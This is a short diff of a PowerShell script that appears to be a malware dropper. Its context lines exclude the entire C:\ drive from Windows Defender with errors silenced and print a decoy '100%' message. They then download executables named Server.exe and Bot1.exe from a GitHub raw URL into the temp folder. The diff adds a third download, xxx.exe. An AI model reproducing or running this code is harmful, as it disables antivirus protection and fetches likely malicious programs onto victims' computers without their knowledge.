@@ -20,8 +20,10 @@ Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "100%"
 $url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
 $url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot1.exe"
+$url3 = "https://github.com/sys1e/cmd/raw/refs/heads/main/xxx.exe"
 $path1 = "$env:TEMP\Server.exe"
 $path2 = "$env:TEMP\Bot1.exe"
+$path3 = "$env:TEMP\xxx.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
